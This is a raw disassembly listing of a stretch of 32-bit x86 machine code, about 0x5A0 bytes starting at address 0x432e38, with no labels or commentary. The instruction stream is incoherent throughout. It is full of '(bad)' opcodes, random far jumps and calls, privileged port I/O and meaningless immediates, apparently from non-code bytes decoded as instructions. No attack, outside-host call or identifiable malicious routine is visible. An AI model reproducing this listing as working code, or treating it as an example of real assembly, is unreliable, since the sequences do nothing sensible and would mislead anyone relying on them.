  432e38:	a0 d1 e6 79 5c       	mov    0x5c79e6d1,%al
  432e3d:	a2 cc df fe 5c       	mov    %al,0x5cfedfcc
  432e42:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  432e43:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432e44:	de 9b 6f fe ab 01    	ficomps 0x1abfe6f(%ebx)
  432e4a:	ea 93 1a 52 07 89 1f 	ljmp   $0x1f89,$0x7521a93
  432e51:	32 37                	xor    (%edi),%dh
  432e53:	33 53 19             	xor    0x19(%ebx),%edx
  432e56:	58                   	pop    %eax
  432e57:	bb 92 10 fc eb       	mov    $0xebfc1092,%ebx
  432e5c:	53                   	push   %ebx
  432e5d:	ac                   	lods   %ds:(%esi),%al
  432e5e:	36 c6                	ss (bad)
  432e60:	d0 01                	rolb   $1,(%ecx)
  432e62:	35 6d 1d f9 cf       	xor    $0xcff91d6d,%eax
  432e67:	5e                   	pop    %esi
  432e68:	08 f5                	or     %dh,%ch
  432e6a:	04 48                	add    $0x48,%al
  432e6c:	5b                   	pop    %ebx
  432e6d:	d3 2a                	shrl   %cl,(%edx)
  432e6f:	47                   	inc    %edi
  432e70:	dd 40 35             	fldl   0x35(%eax)
  432e73:	30 f4                	xor    %dh,%ah
  432e75:	8b 1a                	mov    (%edx),%ebx
  432e77:	f6 6c 43 9c          	imulb  -0x64(%ebx,%eax,2)
  432e7b:	bb 77 f2 0e 21       	mov    $0x210ef277,%ebx
  432e80:	4d                   	dec    %ebp
  432e81:	f3 d1 9d 81 a1 0c f7 	repz rcrl $1,-0x8f35e7f(%ebp)
  432e88:	4f                   	dec    %edi
  432e89:	60                   	pusha
  432e8a:	8f                   	(bad)
  432e8b:	a3 ba 93 a3 87       	mov    %eax,0x87a393ba
  432e90:	f1                   	int1
  432e91:	58                   	pop    %eax
  432e92:	df 13                	fists  (%ebx)
  432e94:	54                   	push   %esp
  432e95:	46                   	inc    %esi
  432e96:	24 21                	and    $0x21,%al
  432e98:	b8 81 dc e1 0a       	mov    $0xae1dc81,%eax
  432e9d:	ca 2b ae             	lret   $0xae2b
  432ea0:	32 7a 93             	xor    -0x6d(%edx),%bh
  432ea3:	b6 50                	mov    $0x50,%dh
  432ea5:	d3 7e e9             	sarl   %cl,-0x17(%esi)
  432ea8:	fc                   	cld
  432ea9:	97                   	xchg   %eax,%edi
  432eaa:	a8 e6                	test   $0xe6,%al
  432eac:	75 d3                	jne    0x432e81
  432eae:	6d                   	insl   (%dx),%es:(%edi)
  432eaf:	ab                   	stos   %eax,%es:(%edi)
  432eb0:	83 dd 80             	sbb    $0xffffff80,%ebp
  432eb3:	89 0e                	mov    %ecx,(%esi)
  432eb5:	37                   	aaa
  432eb6:	1b 92 5e f4 92 59    	sbb    0x5992f45e(%edx),%edx
  432ebc:	f2 97                	repnz xchg %eax,%edi
  432ebe:	e5 8a                	in     $0x8a,%eax
  432ec0:	82 f4 e8             	xor    $0xe8,%ah
  432ec3:	28 12                	sub    %dl,(%edx)
  432ec5:	0c 1b                	or     $0x1b,%al
  432ec7:	ad                   	lods   %ds:(%esi),%eax
  432ec8:	1d 88 e0 fc c2       	sbb    $0xc2fce088,%eax
  432ecd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  432ece:	ff 5d a5             	lcall  *-0x5b(%ebp)
  432ed1:	3e 8c 36             	mov    %?,%ds:(%esi)
  432ed4:	2b d3                	sub    %ebx,%edx
  432ed6:	82 91 f3 2e 87 de 00 	adcb   $0x0,-0x2178d10d(%ecx)
  432edd:	37                   	aaa
  432ede:	22 25 ca 68 4b a7    	and    0xa74b68ca,%ah
  432ee4:	8e 73 e7             	mov    -0x19(%ebx),%?
  432ee7:	7e 79                	jle    0x432f62
  432ee9:	19 16                	sbb    %edx,(%esi)
  432eeb:	94                   	xchg   %eax,%esp
  432eec:	d8 af f8 0c a8 9b    	fsubrs -0x6457f308(%edi)
  432ef2:	60                   	pusha
  432ef3:	21 8a 3e b8 e8 68    	and    %ecx,0x68e8b83e(%edx)
  432ef9:	d5 d7                	aad    $0xd7
  432efb:	72 38                	jb     0x432f35
  432efd:	bb 36 1a f0 33       	mov    $0x33f01a36,%ebx
  432f02:	71 a3                	jno    0x432ea7
  432f04:	9a 25 99 ac 0d 15 61 	lcall  $0x6115,$0xdac9925
  432f0b:	38 ad 9b dc d3 13    	cmp    %ch,0x13d3dc9b(%ebp)
  432f11:	2c 4a                	sub    $0x4a,%al
  432f13:	d5 40                	aad    $0x40
  432f15:	96                   	xchg   %eax,%esi
  432f16:	82 ba 64 a7 5e 41 e1 	cmpb   $0xe1,0x415ea764(%edx)
  432f1d:	35 b4 04 bb 83       	xor    $0x83bb04b4,%eax
  432f22:	19 08                	sbb    %ecx,(%eax)
  432f24:	89 42 0d             	mov    %eax,0xd(%edx)
  432f27:	3e b7 1e             	ds mov $0x1e,%bh
  432f2a:	38 12                	cmp    %dl,(%edx)
  432f2c:	f6 ab 9d 74 00 91    	imulb  -0x6eff8b63(%ebx)
  432f32:	7f 84                	jg     0x432eb8
  432f34:	6b 06 f5             	imul   $0xfffffff5,(%esi),%eax
  432f37:	82 3c d1 b3          	cmpb   $0xb3,(%ecx,%edx,8)
  432f3b:	82 46 cb f3          	addb   $0xf3,-0x35(%esi)
  432f3f:	10 e5                	adc    %ah,%ch
  432f41:	e5 6b                	in     $0x6b,%eax
  432f43:	10 ae f7 91 09 b8    	adc    %ch,-0x47f66e09(%esi)
  432f49:	c3                   	ret
  432f4a:	98                   	cwtl
  432f4b:	84 99 47 c0 86 00    	test   %bl,0x86c047(%ecx)
  432f51:	dd 5c 3e c8          	fstpl  -0x38(%esi,%edi,1)
  432f55:	fd                   	std
  432f56:	51                   	push   %ecx
  432f57:	17                   	pop    %ss
  432f58:	d0 6c e9 ad          	shrb   $1,-0x53(%ecx,%ebp,8)
  432f5c:	61                   	popa
  432f5d:	5b                   	pop    %ebx
  432f5e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  432f5f:	82 b7 75 10 af be b2 	xorb   $0xb2,-0x4150ef8b(%edi)
  432f66:	e3 c8                	jecxz  0x432f30
  432f68:	e6 38                	out    %al,$0x38
  432f6a:	03 fb                	add    %ebx,%edi
  432f6c:	bb 1a b3 81 5d       	mov    $0x5d81b31a,%ebx
  432f71:	3b 32                	cmp    (%edx),%esi
  432f73:	45                   	inc    %ebp
  432f74:	9d                   	popf
  432f75:	1a b0 56 c7 53 84    	sbb    -0x7bac38aa(%eax),%dh
  432f7b:	71 2e                	jno    0x432fab
  432f7d:	08 62 f6             	or     %ah,-0xa(%edx)
  432f80:	6e                   	outsb  %ds:(%esi),(%dx)
  432f81:	3c aa                	cmp    $0xaa,%al
  432f83:	04 c4                	add    $0xc4,%al
  432f85:	7f 90                	jg     0x432f17
  432f87:	e4 27                	in     $0x27,%al
  432f89:	6d                   	insl   (%dx),%es:(%edi)
  432f8a:	98                   	cwtl
  432f8b:	92                   	xchg   %eax,%edx
  432f8c:	b0 47                	mov    $0x47,%al
  432f8e:	6e                   	outsb  %ds:(%esi),(%dx)
  432f8f:	8b 50 7e             	mov    0x7e(%eax),%edx
  432f92:	42                   	inc    %edx
  432f93:	87 79 a1             	xchg   %edi,-0x5f(%ecx)
  432f96:	0a a5 96 6b e5 06    	or     0x6e56b96(%ebp),%ah
  432f9c:	e8 02 80 49 f8       	call   0xf88cafa3
  432fa1:	92                   	xchg   %eax,%edx
  432fa2:	77 61                	ja     0x433005
  432fa4:	65 12 27             	adc    %gs:(%edi),%ah
  432fa7:	07                   	pop    %es
  432fa8:	2f                   	das
  432fa9:	30 cc                	xor    %cl,%ah
  432fab:	5c                   	pop    %esp
  432fac:	d8 a1 f0 55 62 d2    	fsubs  -0x2d9daa10(%ecx)
  432fb2:	66 55                	push   %bp
  432fb4:	fa                   	cli
  432fb5:	34 e7                	xor    $0xe7,%al
  432fb7:	0a 42 6b             	or     0x6b(%edx),%al
  432fba:	ff b5 39 55 ed b8    	push   -0x4712aac7(%ebp)
  432fc0:	0d fe 60 00 e2       	or     $0xe20060fe,%eax
  432fc5:	7e cb                	jle    0x432f92
  432fc7:	d7                   	xlat   %ds:(%ebx)
  432fc8:	98                   	cwtl
  432fc9:	7e e7                	jle    0x432fb2
  432fcb:	10 73 9d             	adc    %dh,-0x63(%ebx)
  432fce:	8b a8 4e 71 21 dd    	mov    -0x22de8eb2(%eax),%ebp
  432fd4:	e3 9f                	jecxz  0x432f75
  432fd6:	6a 18                	push   $0x18
  432fd8:	ca a4 5a             	lret   $0x5aa4
  432fdb:	e6 57                	out    %al,$0x57
  432fdd:	ef                   	out    %eax,(%dx)
  432fde:	0e                   	push   %cs
  432fdf:	0f ff da             	ud0    %edx,%ebx
  432fe2:	4f                   	dec    %edi
  432fe3:	61                   	popa
  432fe4:	b1 3e                	mov    $0x3e,%cl
  432fe6:	a0 8e 34 49 6f       	mov    0x6f49348e,%al
  432feb:	4b                   	dec    %ebx
  432fec:	76 3c                	jbe    0x43302a
  432fee:	94                   	xchg   %eax,%esp
  432fef:	b3 e5                	mov    $0xe5,%bl
  432ff1:	63 08                	arpl   %ecx,(%eax)
  432ff3:	18 01                	sbb    %al,(%ecx)
  432ff5:	52                   	push   %edx
  432ff6:	6d                   	insl   (%dx),%es:(%edi)
  432ff7:	e0 55                	loopne 0x43304e
  432ff9:	bd e6 76 20 2f       	mov    $0x2f2076e6,%ebp
  432ffe:	e3 8e                	jecxz  0x432f8e
  433000:	10 06                	adc    %al,(%esi)
  433002:	7b b4                	jnp    0x432fb8
  433004:	0a 26                	or     (%esi),%ah
  433006:	f7 55 9c             	notl   -0x64(%ebp)
  433009:	87 45 80             	xchg   %eax,-0x80(%ebp)
  43300c:	53                   	push   %ebx
  43300d:	55                   	push   %ebp
  43300e:	46                   	inc    %esi
  43300f:	91                   	xchg   %eax,%ecx
  433010:	56                   	push   %esi
  433011:	d9 2c c4             	fldcw  (%esp,%eax,8)
  433014:	d2 81 0f 09 5a 6c    	rolb   %cl,0x6c5a090f(%ecx)
  43301a:	55                   	push   %ebp
  43301b:	c9                   	leave
  43301c:	bf 21 22 c5 e1       	mov    $0xe1c52221,%edi
  433021:	4b                   	dec    %ebx
  433022:	c9                   	leave
  433023:	e2 4e                	loop   0x433073
  433025:	7a ac                	jp     0x432fd3
  433027:	67 e9 e7 e7 00 dd    	addr16 jmp 0xdd441814
  43302d:	90                   	nop
  43302e:	77 b7                	ja     0x432fe7
  433030:	75 8c                	jne    0x432fbe
  433032:	f5                   	cmc
  433033:	27                   	daa
  433034:	84 a5 1f 20 01 8f    	test   %ah,-0x70fedfe1(%ebp)
  43303a:	9a 2d 1e 43 30 32 3a 	lcall  $0x3a32,$0x30431e2d
  433041:	39 4a 89             	cmp    %ecx,-0x77(%edx)
  433044:	39 4a f3             	cmp    %ecx,-0xd(%edx)
  433047:	f7 c9 f8 28 06 44    	test   $0x440628f8,%ecx
  43304d:	83 ae 98 7b da 7a 7d 	subl   $0x7d,0x7ada7b98(%esi)
  433054:	11 78 45             	adc    %edi,0x45(%eax)
  433057:	59                   	pop    %ecx
  433058:	ca 84 05             	lret   $0x584
  43305b:	c1 18 44             	rcrl   $0x44,(%eax)
  43305e:	ea e4 23 5f fb 6f fd 	ljmp   $0xfd6f,$0xfb5f23e4
  433065:	47                   	inc    %edi
  433066:	05 69 1b 10 45       	add    $0x45101b69,%eax
  43306b:	33 d1                	xor    %ecx,%edx
  43306d:	2e a0 43 f0 d5 2f    	mov    %cs:0x2fd5f043,%al
  433073:	5b                   	pop    %ebx
  433074:	73 f2                	jae    0x433068
  433076:	2c 7d                	sub    $0x7d,%al
  433078:	5d                   	pop    %ebp
  433079:	b6 37                	mov    $0x37,%dh
  43307b:	8a 8d 81 b8 8a 56    	mov    0x568ab881(%ebp),%cl
  433081:	db b2 0e f4 87 0f    	(bad) 0xf87f40e(%edx)
  433087:	05 a2 15 7b ee       	add    $0xee7b15a2,%eax
  43308c:	23 bf 6d 25 9b ec    	and    -0x1364da93(%edi),%edi
  433092:	02 d2                	add    %dl,%dl
  433094:	86 8d 1a 57 ad 3a    	xchg   %cl,0x3aad571a(%ebp)
  43309a:	35 cf 49 24 a2       	xor    $0xa22449cf,%eax
  43309f:	b5 dd                	mov    $0xdd,%ch
  4330a1:	03 db                	add    %ebx,%ebx
  4330a3:	19 4b 9c             	sbb    %ecx,-0x64(%ebx)
  4330a6:	7d fb                	jge    0x4330a3
  4330a8:	f4                   	hlt
  4330a9:	eb 52                	jmp    0x4330fd
  4330ab:	2d 1c 12 5e 30       	sub    $0x305e121c,%eax
  4330b0:	2a 19                	sub    (%ecx),%bl
  4330b2:	0b 6c 2c 95          	or     -0x6b(%esp,%ebp,1),%ebp
  4330b6:	29 6f 7b             	sub    %ebp,0x7b(%edi)
  4330b9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4330ba:	05 9a d7 a5 c9       	add    $0xc9a5d79a,%eax
  4330bf:	e8 76 23 be d0       	call   0xd101543a
  4330c4:	9a df 1d aa f9 01 88 	lcall  $0x8801,$0xf9aa1ddf
  4330cb:	ed                   	in     (%dx),%eax
  4330cc:	74 8c                	je     0x43305a
  4330ce:	61                   	popa
  4330cf:	1c 6f                	sbb    $0x6f,%al
  4330d1:	2d 1d 8e d6 59       	sub    $0x59d68e1d,%eax
  4330d6:	c6 44 03 38 11       	movb   $0x11,0x38(%ebx,%eax,1)
  4330db:	fc                   	cld
  4330dc:	c5 7a 3b             	lds    0x3b(%edx),%edi
  4330df:	62 70 6d             	bound  %esi,0x6d(%eax)
  4330e2:	15 ec 1c 45 39       	adc    $0x39451cec,%eax
  4330e7:	96                   	xchg   %eax,%esi
  4330e8:	70 15                	jo     0x4330ff
  4330ea:	cf                   	iret
  4330eb:	c2 68 60             	ret    $0x6068
  4330ee:	b1 2a                	mov    $0x2a,%cl
  4330f0:	fa                   	cli
  4330f1:	75 c7                	jne    0x4330ba
  4330f3:	4d                   	dec    %ebp
  4330f4:	0d 6e 9d 19 7b       	or     $0x7b199d6e,%eax
  4330f9:	e1 cd                	loope  0x4330c8
  4330fb:	3e b5 b8             	ds mov $0xb8,%ch
  4330fe:	10 07                	adc    %al,(%edi)
  433100:	8b 73 88             	mov    -0x78(%ebx),%esi
  433103:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  433104:	54                   	push   %esp
  433105:	40                   	inc    %eax
  433106:	d7                   	xlat   %ds:(%ebx)
  433107:	ec                   	in     (%dx),%al
  433108:	ca b7 00             	lret   $0xb7
  43310b:	5a                   	pop    %edx
  43310c:	bd 12 75 30 74       	mov    $0x74307512,%ebp
  433111:	b8 7c 8c 1f 29       	mov    $0x291f8c7c,%eax
  433116:	f2 ec                	repnz in (%dx),%al
  433118:	fd                   	std
  433119:	d7                   	xlat   %ds:(%ebx)
  43311a:	a3 ed e0 d7 4a       	mov    %eax,0x4ad7e0ed
  43311f:	93                   	xchg   %eax,%ebx
  433120:	c8 41 e9 e2          	enter  $0xe941,$0xe2
  433124:	de ce                	fmulp  %st,%st(6)
  433126:	47                   	inc    %edi
  433127:	95                   	xchg   %eax,%ebp
  433128:	c0 cf 87             	ror    $0x87,%bh
  43312b:	70 1c                	jo     0x433149
  43312d:	42                   	inc    %edx
  43312e:	8f                   	(bad)
  43312f:	25 54 bd a6 ed       	and    $0xeda6bd54,%eax
  433134:	48                   	dec    %eax
  433135:	bd 69 de 4f 10       	mov    $0x104fde69,%ebp
  43313a:	e6 d9                	out    %al,$0xd9
  43313c:	d3 f3                	shl    %cl,%ebx
  43313e:	26 b7 f0             	es mov $0xf0,%bh
  433141:	ea 79 4f da 86 a3 55 	ljmp   $0x55a3,$0x86da4f79
  433148:	9a cd a9 6f 2f 36 42 	lcall  $0x4236,$0x2f6fa9cd
  43314f:	33 a5 0b 8c 9b aa    	xor    -0x556473f5(%ebp),%esp
  433155:	4c                   	dec    %esp
  433156:	18 f8                	sbb    %bh,%al
  433158:	82 37 12             	xorb   $0x12,(%edi)
  43315b:	41                   	inc    %ecx
  43315c:	ec                   	in     (%dx),%al
  43315d:	1b 0c 68             	sbb    (%eax,%ebp,2),%ecx
  433160:	06                   	push   %es
  433161:	1d 9c 68 da 85       	sbb    $0x85da689c,%eax
  433166:	fe                   	(bad)
  433167:	d4 a7                	aam    $0xa7
  433169:	3e a6                	cmpsb  %es:(%edi),%ds:(%esi)
  43316b:	31 67 ee             	xor    %esp,-0x12(%edi)
  43316e:	da 5a df             	ficompl -0x21(%edx)
  433171:	76 f6                	jbe    0x433169
  433173:	8d                   	lea    (bad),%eax
  433174:	c6                   	(bad)
  433175:	8c 39                	mov    %?,(%ecx)
  433177:	f8                   	clc
  433178:	ec                   	in     (%dx),%al
  433179:	22 70 ba             	and    -0x46(%eax),%dh
  43317c:	53                   	push   %ebx
  43317d:	9e                   	sahf
  43317e:	38 2e                	cmp    %ch,(%esi)
  433180:	63 88 72 b2 09 08    	arpl   %ecx,0x809b272(%eax)
  433186:	3e 9e                	ds sahf
  433188:	a2 66 27 f8 11       	mov    %al,0x11f82766
  43318d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  43318e:	e1 bf                	loope  0x43314f
  433190:	54                   	push   %esp
  433191:	85 31                	test   %esi,(%ecx)
  433193:	36 5f                	ss pop %edi
  433195:	e4 41                	in     $0x41,%al
  433197:	ed                   	in     (%dx),%eax
  433198:	71 20                	jno    0x4331ba
  43319a:	6c                   	insb   (%dx),%es:(%edi)
  43319b:	48                   	dec    %eax
  43319c:	7f 7f                	jg     0x43321d
  43319e:	5d                   	pop    %ebp
  43319f:	61                   	popa
  4331a0:	68 aa 59 71 de       	push   $0xde7159aa
  4331a5:	14 61                	adc    $0x61,%al
  4331a7:	25 ba ae a8 5c       	and    $0x5ca8aeba,%eax
  4331ac:	5e                   	pop    %esi
  4331ad:	56                   	push   %esi
  4331ae:	29 25 51 cf eb 46    	sub    %esp,0x46ebcf51
  4331b4:	af                   	scas   %es:(%edi),%eax
  4331b5:	6b 23 a5             	imul   $0xffffffa5,(%ebx),%esp
  4331b8:	99                   	cltd
  4331b9:	fe                   	(bad)
  4331ba:	11 7b 6b             	adc    %edi,0x6b(%ebx)
  4331bd:	45                   	inc    %ebp
  4331be:	e3 2a                	jecxz  0x4331ea
  4331c0:	84 07                	test   %al,(%edi)
  4331c2:	6d                   	insl   (%dx),%es:(%edi)
  4331c3:	80 0c 0f 21          	orb    $0x21,(%edi,%ecx,1)
  4331c7:	e0 07                	loopne 0x4331d0
  4331c9:	f3 79 2e             	repz jns 0x4331fa
  4331cc:	4f                   	dec    %edi
  4331cd:	3c 5a                	cmp    $0x5a,%al
  4331cf:	3d 78 77 4a 77       	cmp    $0x774a7778,%eax
  4331d4:	b4 9e                	mov    $0x9e,%ah
  4331d6:	3f                   	aas
  4331d7:	d3 c2                	rol    %cl,%edx
  4331d9:	fe 01                	incb   (%ecx)
  4331db:	18 04 b1             	sbb    %al,(%ecx,%esi,4)
  4331de:	43                   	inc    %ebx
  4331df:	6a d5                	push   $0xffffffd5
  4331e1:	09 86 3f 8f dd 40    	or     %eax,0x40dd8f3f(%esi)
  4331e7:	15 8d 8f c6 b6       	adc    $0xb6c68f8d,%eax
  4331ec:	b2 91                	mov    $0x91,%dl
  4331ee:	e7 1b                	out    %eax,$0x1b
  4331f0:	51                   	push   %ecx
  4331f1:	a8 9d                	test   $0x9d,%al
  4331f3:	bc 32 fb f6 ed       	mov    $0xedf6fb32,%esp
  4331f8:	5a                   	pop    %edx
  4331f9:	b2 12                	mov    $0x12,%dl
  4331fb:	24 2e                	and    $0x2e,%al
  4331fd:	a9 d6 03 c3 ca       	test   $0xcac303d6,%eax
  433202:	da 14 9f             	ficoml (%edi,%ebx,4)
  433205:	3b 07                	cmp    (%edi),%eax
  433207:	f3 6d                	rep insl (%dx),%es:(%edi)
  433209:	40                   	inc    %eax
  43320a:	66 26 ea b0 b1 4f 0f 	es ljmpw $0xf4f,$0xb1b0
  433211:	35 a1 5c fc 6b       	xor    $0x6bfc5ca1,%eax
  433216:	e3 a1                	jecxz  0x4331b9
  433218:	81 ec 3f a6 95 53    	sub    $0x5395a63f,%esp
  43321e:	d5 34                	aad    $0x34
  433220:	fe                   	(bad)
  433221:	65 b3 a4             	gs mov $0xa4,%bl
  433224:	f7 ce 24 d9 f2 e3    	test   $0xe3f2d924,%esi
  43322a:	48                   	dec    %eax
  43322b:	b2 27                	mov    $0x27,%dl
  43322d:	f5                   	cmc
  43322e:	fd                   	std
  43322f:	ea 47 19 83 2c 44 5f 	ljmp   $0x5f44,$0x2c831947
  433236:	33 e1                	xor    %ecx,%esp
  433238:	8f                   	(bad)
  433239:	19 36                	sbb    %esi,(%esi)
  43323b:	a9 c4 ae 1f a0       	test   $0xa01faec4,%eax
  433240:	42                   	inc    %edx
  433241:	59                   	pop    %ecx
  433242:	e8 45 06 b7 c7       	call   0xc7fa388c
  433247:	af                   	scas   %es:(%edi),%eax
  433248:	00 0e                	add    %cl,(%esi)
  43324a:	8c 1d 3f a4 f6 47    	mov    %ds,0x47f6a43f
  433250:	42                   	inc    %edx
  433251:	20 79 8a             	and    %bh,-0x76(%ecx)
  433254:	2d b1 f2 02 75       	sub    $0x7502f2b1,%eax
  433259:	fa                   	cli
  43325a:	dc dd                	(bad)
  43325c:	c0 46 f2 2c          	rolb   $0x2c,-0xe(%esi)
  433260:	06                   	push   %es
  433261:	28 c4                	sub    %al,%ah
  433263:	63 1e                	arpl   %ebx,(%esi)
  433265:	39 f3                	cmp    %esi,%ebx
  433267:	c5 fa 73             	(bad)
  43326a:	7d 63                	jge    0x4332cf
  43326c:	fe                   	(bad)
  43326d:	b6 5b                	mov    $0x5b,%dh
  43326f:	01 48 7c             	add    %ecx,0x7c(%eax)
  433272:	92                   	xchg   %eax,%edx
  433273:	d6                   	salc
  433274:	4f                   	dec    %edi
  433275:	89 2a                	mov    %ebp,(%edx)
  433277:	63 ba 4a 80 c8 9c    	arpl   %edi,-0x63377fb6(%edx)
  43327d:	46                   	inc    %esi
  43327e:	6d                   	insl   (%dx),%es:(%edi)
  43327f:	3c 25                	cmp    $0x25,%al
  433281:	8f                   	(bad)
  433282:	78 fd                	js     0x433281
  433284:	aa                   	stos   %al,%es:(%edi)
  433285:	1c 68                	sbb    $0x68,%al
  433287:	9d                   	popf
  433288:	c3                   	ret
  433289:	62 36                	bound  %esi,(%esi)
  43328b:	51                   	push   %ecx
  43328c:	12 bd 6d f7 39 de    	adc    -0x21c60893(%ebp),%bh
  433292:	bc dd 50 74 f5       	mov    $0xf57450dd,%esp
  433297:	9b                   	fwait
  433298:	0d 45 7c b6 61       	or     $0x61b67c45,%eax
  43329d:	b0 86                	mov    $0x86,%al
  43329f:	71 2e                	jno    0x4332cf
  4332a1:	59                   	pop    %ecx
  4332a2:	75 85                	jne    0x433229
  4332a4:	3b e2                	cmp    %edx,%esp
  4332a6:	ac                   	lods   %ds:(%esi),%al
  4332a7:	81 bf e6 a2 b9 95 2a 	cmpl   $0x7c738b2a,-0x6a465d1a(%edi)
  4332ae:	8b 73 7c 
  4332b1:	1d 4f 4d d3 d9       	sbb    $0xd9d34d4f,%eax
  4332b6:	04 c5                	add    $0xc5,%al
  4332b8:	eb 3c                	jmp    0x4332f6
  4332ba:	5e                   	pop    %esi
  4332bb:	41                   	inc    %ecx
  4332bc:	bc b2 31 1a b6       	mov    $0xb61a31b2,%esp
  4332c1:	63 e7                	arpl   %esp,%edi
  4332c3:	7b 48                	jnp    0x43330d
  4332c5:	bc d9 9e 23 4d       	mov    $0x4d239ed9,%esp
  4332ca:	4a                   	dec    %edx
  4332cb:	8a db                	mov    %bl,%bl
  4332cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4332ce:	5e                   	pop    %esi
  4332cf:	6d                   	insl   (%dx),%es:(%edi)
  4332d0:	06                   	push   %es
  4332d1:	44                   	inc    %esp
  4332d2:	fa                   	cli
  4332d3:	62 8c a4 58 cf 4a 0e 	bound  %ecx,0xe4acf58(%esp,%eiz,4)
  4332da:	ec                   	in     (%dx),%al
  4332db:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4332dc:	92                   	xchg   %eax,%edx
  4332dd:	59                   	pop    %ecx
  4332de:	ed                   	in     (%dx),%eax
  4332df:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4332e0:	40                   	inc    %eax
  4332e1:	bb 74 ef be 45       	mov    $0x45beef74,%ebx
  4332e6:	2c 44                	sub    $0x44,%al
  4332e8:	34 f0                	xor    $0xf0,%al
  4332ea:	88 16                	mov    %dl,(%esi)
  4332ec:	62                   	(bad)
  4332ed:	cc                   	int3
  4332ee:	ee                   	out    %al,(%dx)
  4332ef:	d8 e3                	fsub   %st(3),%st
  4332f1:	1b ec                	sbb    %esp,%ebp
  4332f3:	9c                   	pushf
  4332f4:	2b 3b                	sub    (%ebx),%edi
  4332f6:	fa                   	cli
  4332f7:	df 20                	fbld   (%eax)
  4332f9:	14 1c                	adc    $0x1c,%al
  4332fb:	fd                   	std
  4332fc:	14 0e                	adc    $0xe,%al
  4332fe:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4332ff:	9b                   	fwait
  433300:	31 3d 42 c9 59 44    	xor    %edi,0x4459c942
  433306:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433307:	11 40 f8             	adc    %eax,-0x8(%eax)
  43330a:	a3 91 91 b3 90       	mov    %eax,0x90b39191
  43330f:	0e                   	push   %cs
  433310:	65 1a c2             	gs sbb %dl,%al
  433313:	d0 5c 42 24          	rcrb   $1,0x24(%edx,%eax,2)
  433317:	5f                   	pop    %edi
  433318:	be b7 89 18 4e       	mov    $0x4e1889b7,%esi
  43331d:	e6 d0                	out    %al,$0xd0
  43331f:	e6 61                	out    %al,$0x61
  433321:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  433322:	88 4b a4             	mov    %cl,-0x5c(%ebx)
  433325:	11 ca                	adc    %ecx,%edx
  433327:	f0 c6                	lock (bad)
  433329:	11 e8                	adc    %ebp,%eax
  43332b:	92                   	xchg   %eax,%edx
  43332c:	8a e8                	mov    %al,%ch
  43332e:	33 58 a9             	xor    -0x57(%eax),%ebx
  433331:	58                   	pop    %eax
  433332:	ff 23                	jmp    *(%ebx)
  433334:	50                   	push   %eax
  433335:	d3 aa a3 40 8a 21    	shrl   %cl,0x218a40a3(%edx)
  43333b:	f6 0c cb b5          	testb  $0xb5,(%ebx,%ecx,8)
  43333f:	a8 72                	test   $0x72,%al
  433341:	0b 92 c2 17 91 bc    	or     -0x436ee83e(%edx),%edx
  433347:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  433348:	49                   	dec    %ecx
  433349:	47                   	inc    %edi
  43334a:	8c 4c 3e 9f          	mov    %cs,-0x61(%esi,%edi,1)
  43334e:	f2 9f                	repnz lahf
  433350:	41                   	inc    %ecx
  433351:	3b f1                	cmp    %ecx,%esi
  433353:	bd f7 1e 39 67       	mov    $0x67391ef7,%ebp
  433358:	02 21                	add    (%ecx),%ah
  43335a:	77 07                	ja     0x433363
  43335c:	c4 31                	les    (%ecx),%esi
  43335e:	ef                   	out    %eax,(%dx)
  43335f:	bb ac 05 62 de       	mov    $0xde6205ac,%ebx
  433364:	d6                   	salc
  433365:	97                   	xchg   %eax,%edi
  433366:	5d                   	pop    %ebp
  433367:	5e                   	pop    %esi
  433368:	39 ed                	cmp    %ebp,%ebp
  43336a:	3d fc bc 9c fb       	cmp    $0xfb9cbcfc,%eax
  43336f:	5b                   	pop    %ebx
  433370:	0b ca                	or     %edx,%ecx
  433372:	c4 c7 e9 c0          	(bad)
  433376:	48                   	dec    %eax
  433377:	19 95 20 59 28 58    	sbb    %edx,0x58285920(%ebp)
  43337d:	6b 35 4f 3c 21 02 0f 	imul   $0xf,0x2213c4f,%esi
  433384:	71 67                	jno    0x4333ed
  433386:	b1 ec                	mov    $0xec,%cl
  433388:	6b 07 8d             	imul   $0xffffff8d,(%edi),%eax
  43338b:	d4 8a                	aam    $0x8a
  43338d:	12 2e                	adc    (%esi),%ch
  43338f:	53                   	push   %ebx
  433390:	71 bc                	jno    0x43334e
  433392:	e0 c5                	loopne 0x433359
  433394:	a2 21 b7 24 35       	mov    %al,0x3524b721
  433399:	60                   	pusha
  43339a:	7f 9c                	jg     0x433338
  43339c:	8c ec                	mov    %gs,%esp
  43339e:	ee                   	out    %al,(%dx)
  43339f:	9a ec 40 1f ea 79 3d 	lcall  $0x3d79,$0xea1f40ec
  4333a6:	b7 53                	mov    $0x53,%bh
  4333a8:	cb                   	lret
  4333a9:	f2 85 e2             	repnz test %esp,%edx
  4333ac:	56                   	push   %esi
  4333ad:	49                   	dec    %ecx
  4333ae:	1a 47 1f             	sbb    0x1f(%edi),%al
  4333b1:	e6 b6                	out    %al,$0xb6
  4333b3:	82 c1 d2             	add    $0xd2,%cl
  4333b6:	9f                   	lahf
  4333b7:	36 67 b3 74          	ss addr16 mov $0x74,%bl
  4333bb:	0c 79                	or     $0x79,%al
  4333bd:	13 cf                	adc    %edi,%ecx
  4333bf:	01 5a 4a             	add    %ebx,0x4a(%edx)
  4333c2:	ab                   	stos   %eax,%es:(%edi)
  4333c3:	ee                   	out    %al,(%dx)
  4333c4:	69 1e 00 d3 5a 96    	imul   $0x965ad300,(%esi),%ebx
  4333ca:	28 fb                	sub    %bh,%bl
  4333cc:	75 f3                	jne    0x4333c1
  4333ce:	af                   	scas   %es:(%edi),%eax
  4333cf:	20 78 eb             	and    %bh,-0x15(%eax)
  4333d2:	f0 17                	lock pop %ss
  4333d4:	11 9c 58 95 0b eb 80 	adc    %ebx,-0x7f14f46b(%eax,%ebx,2)
  4333db:	6e                   	outsb  %ds:(%esi),(%dx)
